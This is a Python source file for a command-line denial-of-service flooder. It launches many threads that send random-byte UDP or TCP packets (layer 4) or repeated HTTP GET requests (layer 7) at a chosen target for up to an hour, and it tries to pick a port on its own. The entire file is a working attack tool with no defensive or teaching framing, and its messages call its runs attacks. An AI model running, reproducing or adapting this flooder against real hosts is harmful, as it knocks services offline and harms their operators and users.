import argparse
import os
import socket
from urllib.parse import urlparse
import random
import time 
import threading

class Sockets(object):
    def __init__(self, ip, port, time, protocol, osi, threads) -> None: 
        
        if osi == 7 and not "://" in ip:
            print("Schema must be included in L7 attack hosts.")
            os._exit(1)
            
        self.max_threads = 950
        self.max_time = 3600
        self.debugging = False
        self.url = osi == 7 and urlparse(ip).hostname or None
        self.rpc = 150 
        self.layer = osi 
        self.threads = threads 
        self.socket_timeout = 3
        self.sleep_time = .1
        self.ip = self.layer == 7 and socket.gethostbyname(urlparse(ip).hostname) or ip
        self.port = port 
        self.time = time 
        self.protocol = protocol
        
        if self.check_parameters() == False:
            print("Exiting program, parameters invalid.")
            os._exit(1)


    def check_parameters(self):
        try:
            if self.layer == 7:
                socket.gethostbyname(self.ip)
                if self.debugging:
                    print('[+] Verified IP')
        except Exception as e:
            return False 
        if self.port > 65535:
            print("Port ranges 1-65535")
            return False 
        elif self.time > self.max_time:
            print(f"Max time = {self.max_time}")
            return False 
        elif not self.protocol.upper() in ["UDP","TCP"]:
            print("Excepted protocol to be UDP / TCP ")
            return False
        elif not self.layer in [4,7]:
            print("Layer must be either 4 or 7")
            return False 
        elif self.threads > self.max_threads:
            print(f"Max threads = {self.max_threads}")
            return False 

        if self.protocol.upper() == "UDP":
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        else:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if self.debugging:
            print("[+] Verified parameters.")
        return True
    
    def send_flood(self):
        start_time = time.time()

        if self.debugging:
            if self.layer == 4:
                print(f"Starting L4 Attack on {self.ip} port {self.port} using for {self.time} second(s) using protocol {self.protocol}")
            else:
                print(f"Starting L7 Attack on {self.ip} port {self.port} using for {self.time} second(s) using protocol {self.protocol}")
            
        while time.time() - start_time < self.time:
            sock = self.protocol == "UDP" and socket.socket(socket.AF_INET, socket.SOCK_DGRAM) or socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if self.protocol == "TCP":
                try:
                    if self.layer == 4:
                        sock.connect((self.ip, self.port))
                    else:
                        sock.connect((self.url, self.port))
                    for _ in range(self.rpc):
                        packet = None 
                        if self.layer == 7:
                            packet = "GET / HTTP/1.1\r\nHost:%s\r\n\r\n" % self.url
                            sock.send(str.encode(packet))
                            sock.close()
                            break
                        else:
                            packet = os.urandom(random.randint(1, 1024))
                            sock.send(packet)
                    sock.close()
                except Exception as e:
                    sock.close()
            else:
                try:
                    for _ in range(self.rpc):
                        sock.sendto(os.urandom(random.randint(1, 1024)), (self.ip, self.port))
                    sock.close()
                except Exception as e:
                    time.sleep(self.sleep_time)


    def find_open_port(self) -> int:
        try:
            
            temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
            if self.layer == 7:
                if temp_socket.connect((socket.gethostbyaddr(self.ip)[2][0], 443)):
                    return 443 
            else:
                if temp_socket.connect((self.ip, 53)):
                    return 53 # udp 
            return 80
        except Exception as e:
            return 80

def pass_thread(ip, time, protocol, osilayer, threads, port=None):
    sock_obj = None 
    if port == None:
        sock_obj = Sockets(ip, 0, time, protocol, osilayer, threads)
        sock_obj.port = sock_obj.find_open_port()
    else:
        sock_obj = Sockets(ip, port, time, protocol, osilayer, threads)

    sock_obj.check_parameters()
    sock_obj.send_flood()
    
def main():

    args = argparse.ArgumentParser()

    args.add_argument('-ip', type=str, required=True)
    args.add_argument('-port',type=int, required=False)
    args.add_argument('-time', type=int, required=True)
    args.add_argument('-protocol', default="UDP", required=False)
    args.add_argument('-osilayer',type=int, required=True)
    args.add_argument('-threads',type=int, required=False, default=50)
    args = args.parse_args()

    
    for _ in range(args.threads):
        _thr = threading.Thread(target=pass_thread, args=(args.ip, args.time, args.protocol, args.osilayer, args.threads, args.port))
        _thr.daemon = True
        _thr.start()
    time.sleep(args.threads / 100)
    
    print("All threads started.")
    time.sleep(args.time)

if __name__ == "__main__":
    main()
